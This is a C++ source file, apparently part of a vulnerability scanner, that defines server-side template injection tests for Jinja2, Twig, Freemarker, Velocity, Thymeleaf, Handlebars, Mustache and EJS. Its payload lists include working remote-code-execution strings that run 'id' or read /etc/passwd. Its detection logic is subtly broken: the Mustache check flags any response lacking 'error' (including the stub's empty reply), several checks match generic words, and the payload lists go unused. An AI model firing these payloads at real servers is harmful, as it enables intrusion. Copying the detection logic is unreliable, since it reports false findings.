#include "../include/SSTIDetector.h"
#include <sstream>
#include <algorithm>

SSTIDetector::SSTIDetector() : VulnerabilityScanner() {
    initializeEngines();
}

void SSTIDetector::initializeEngines() {
    // Jinja2 (Python - Flask, Django)
    engines.push_back({
        "Jinja2",
        {
            "{{7*7}}",
            "{{config}}",
            "{{config.items()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\")}}{% endif %}{% endfor %}"
        },
        {"49", "config", "application", "catch_warnings", "uid=", "gid="}
    });

    // Twig (PHP - Symfony)
    engines.push_back({
        "Twig",
        {
            "{{7*7}}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
            "{{_self.env.getFilter('system')}}",
            "{{['id','']|sort('system')}}"
        },
        {"49", "uid=", "gid=", "system"}
    });

    // Freemarker (Java)
    engines.push_back({
        "Freemarker",
        {
            "${7*7}",
            "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
            "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}",
            "<#assign classloader=product.class.protectionDomain.classLoader>",
            "${classloader.loadClass('java.lang.Runtime').getRuntime().exec('id')}"
        },
        {"49", "uid=", "gid=", "root:", "freemarker"}
    });

    // Velocity (Java)
    engines.push_back({
        "Velocity",
        {
            "#set($x=7*7)$x",
            "#set($str=$class.inspect('java.lang.String').type)",
            "#set($chr=$class.inspect('java.lang.Character').type)",
            "#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))",
            "$ex.waitFor()",
            "#set($out=$ex.getInputStream())"
        },
        {"49", "uid=", "gid=", "Runtime"}
    });

    // Thymeleaf (Java - Spring)
    engines.push_back({
        "Thymeleaf",
        {
            "[[${7*7}]]",
            "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
            "[[${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}]]",
            "[(${T(java.lang.Runtime).getRuntime().exec('id')})]"
        },
        {"49", "uid=", "gid=", "Runtime"}
    });

    // Handlebars (JavaScript - Node.js)
    engines.push_back({
        "Handlebars",
        {
            "{{#with 'constructor'}}{{#with split as |arr|}}{{pop (push arr 'return require(\"child_process\").execSync(\"id\");')}}{{#with arr}}{{#with (concat arr)}}{{#each (split arr ' ')}}{{#with @root}}{{lookup @root @key}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
            "{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}}",
            "{{#with 'constructor' as |arr|}}{{arr}}{{/with}}"
        },
        {"uid=", "gid=", "constructor", "child_process"}
    });

    // Mustache (Multi-language)
    engines.push_back({
        "Mustache",
        {
            "{{=<% %>=}}<%={{ }}=%>{{7*7}}",
            "{{#lambda}}{{7*7}}{{/lambda}}"
        },
        {"49", "lambda"}
    });

    // EJS (JavaScript - Node.js)
    engines.push_back({
        "EJS",
        {
            "<%= 7*7 %>",
            "<%- 7*7 %>",
            "<%= global.process.mainModule.require('child_process').execSync('id') %>",
            "<%- global.process.mainModule.require('child_process').execSync('id') %>"
        },
        {"49", "uid=", "gid=", "child_process"}
    });
}

ScanResult SSTIDetector::scan(const std::string& target, int port) {
    ScanResult result;
    result.target = target;
    result.port = port;
    result.scannerName = getName();
    result.vulnerable = false;

    // Test each template engine
    if (testJinja2(target, port)) {
        result.vulnerable = true;
        result.details = "Jinja2 SSTI vulnerability detected - Python template engine";
        result.severity = "Critical";
        result.recommendation = "Sanitize user input, use sandboxed templates, disable dangerous functions";
        return result;
    }

    if (testTwig(target, port)) {
        result.vulnerable = true;
        result.details = "Twig SSTI vulnerability detected - PHP template engine";
        result.severity = "Critical";
        result.recommendation = "Sanitize user input, use Twig sandbox mode, restrict template functions";
        return result;
    }

    if (testFreemarker(target, port)) {
        result.vulnerable = true;
        result.details = "Freemarker SSTI vulnerability detected - Java template engine";
        result.severity = "Critical";
        result.recommendation = "Sanitize user input, use Freemarker configuration restrictions";
        return result;
    }

    if (testVelocity(target, port)) {
        result.vulnerable = true;
        result.details = "Velocity SSTI vulnerability detected - Java template engine";
        result.severity = "Critical";
        result.recommendation = "Sanitize user input, restrict Velocity introspection";
        return result;
    }

    if (testThymeleaf(target, port)) {
        result.vulnerable = true;
        result.details = "Thymeleaf SSTI vulnerability detected - Java/Spring template engine";
        result.severity = "Critical";
        result.recommendation = "Sanitize user input, use SpringEL restrictions";
        return result;
    }

    if (testHandlebars(target, port)) {
        result.vulnerable = true;
        result.details = "Handlebars SSTI vulnerability detected - JavaScript template engine";
        result.severity = "Critical";
        result.recommendation = "Sanitize user input, use Handlebars strict mode";
        return result;
    }

    if (testMustache(target, port)) {
        result.vulnerable = true;
        result.details = "Mustache SSTI vulnerability detected";
        result.severity = "High";
        result.recommendation = "Sanitize user input, validate template syntax";
        return result;
    }

    if (testEJS(target, port)) {
        result.vulnerable = true;
        result.details = "EJS SSTI vulnerability detected - Node.js template engine";
        result.severity = "Critical";
        result.recommendation = "Sanitize user input, use EJS delimiter restrictions";
        return result;
    }

    result.details = "No SSTI vulnerabilities detected";
    result.severity = "Info";
    return result;
}

bool SSTIDetector::testJinja2(const std::string& target, int port) {
    // Test basic math expression
    std::string response = sendTemplatePayload(target, port, "{{7*7}}");
    if (response.find("49") != std::string::npos) {
        return true;
    }

    // Test config access
    response = sendTemplatePayload(target, port, "{{config}}");
    if (response.find("SECRET_KEY") != std::string::npos || 
        response.find("DEBUG") != std::string::npos) {
        return true;
    }

    // Test class introspection
    response = sendTemplatePayload(target, port, "{{''.__class__}}");
    if (response.find("str") != std::string::npos || 
        response.find("class") != std::string::npos) {
        return true;
    }

    return false;
}

bool SSTIDetector::testTwig(const std::string& target, int port) {
    // Test basic math
    std::string response = sendTemplatePayload(target, port, "{{7*7}}");
    if (response.find("49") != std::string::npos) {
        return true;
    }

    // Test filter abuse
    response = sendTemplatePayload(target, port, "{{_self}}");
    if (response.find("Twig") != std::string::npos || 
        response.find("Template") != std::string::npos) {
        return true;
    }

    return false;
}

bool SSTIDetector::testFreemarker(const std::string& target, int port) {
    // Test basic math
    std::string response = sendTemplatePayload(target, port, "${7*7}");
    if (response.find("49") != std::string::npos) {
        return true;
    }

    // Test class access
    response = sendTemplatePayload(target, port, "${product.class}");
    if (response.find("class") != std::string::npos || 
        response.find("java") != std::string::npos) {
        return true;
    }

    return false;
}

bool SSTIDetector::testVelocity(const std::string& target, int port) {
    // Test basic math
    std::string response = sendTemplatePayload(target, port, "#set($x=7*7)$x");
    if (response.find("49") != std::string::npos) {
        return true;
    }

    // Test class introspection
    response = sendTemplatePayload(target, port, "$class");
    if (response.find("class") != std::string::npos) {
        return true;
    }

    return false;
}

bool SSTIDetector::testThymeleaf(const std::string& target, int port) {
    // Test basic math
    std::string response = sendTemplatePayload(target, port, "[[${7*7}]]");
    if (response.find("49") != std::string::npos) {
        return true;
    }

    // Test SpringEL
    response = sendTemplatePayload(target, port, "[[${T(java.lang.System)}]]");
    if (response.find("java") != std::string::npos || 
        response.find("System") != std::string::npos) {
        return true;
    }

    return false;
}

bool SSTIDetector::testHandlebars(const std::string& target, int port) {
    // Test basic expression
    std::string response = sendTemplatePayload(target, port, "{{constructor}}");
    if (response.find("function") != std::string::npos || 
        response.find("constructor") != std::string::npos) {
        return true;
    }

    return false;
}

bool SSTIDetector::testMustache(const std::string& target, int port) {
    // Test delimiter change
    std::string response = sendTemplatePayload(target, port, "{{=<% %>=}}");
    if (response.empty() || response.find("error") == std::string::npos) {
        return true;
    }

    return false;
}

bool SSTIDetector::testEJS(const std::string& target, int port) {
    // Test basic math
    std::string response = sendTemplatePayload(target, port, "<%= 7*7 %>");
    if (response.find("49") != std::string::npos) {
        return true;
    }

    // Test global access
    response = sendTemplatePayload(target, port, "<%= global %>");
    if (response.find("Object") != std::string::npos || 
        response.find("global") != std::string::npos) {
        return true;
    }

    return false;
}

std::string SSTIDetector::sendTemplatePayload(const std::string& target, int port, const std::string& payload) {
    // Simulate HTTP request with template payload
    // In real implementation, this would send actual HTTP requests
    std::ostringstream request;
    request << "GET /?template=" << payload << " HTTP/1.1\r\n";
    request << "Host: " << target << "\r\n";
    request << "User-Agent: C3NT1P3D3-Scanner/3.0\r\n";
    request << "Accept: */*\r\n";
    request << "\r\n";

    // Simulation mode - return empty
    return "";
}

bool SSTIDetector::checkResponse(const std::string& response, const std::vector<std::string>& indicators) {
    for (const auto& indicator : indicators) {
        if (response.find(indicator) != std::string::npos) {
            return true;
        }
    }
    return false;
}
